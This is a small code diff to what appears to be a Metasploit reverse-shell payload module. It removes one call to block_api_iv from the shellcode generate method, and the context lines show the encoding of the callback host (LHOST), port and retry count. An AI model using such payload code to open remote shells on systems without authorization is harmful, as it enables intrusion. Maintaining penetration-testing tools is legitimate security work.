@@ -40,7 +40,6 @@ module MetasploitModule
   end
 
   def generate(_opts = {})
-    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack1('N')
     encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack1('V')
     retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
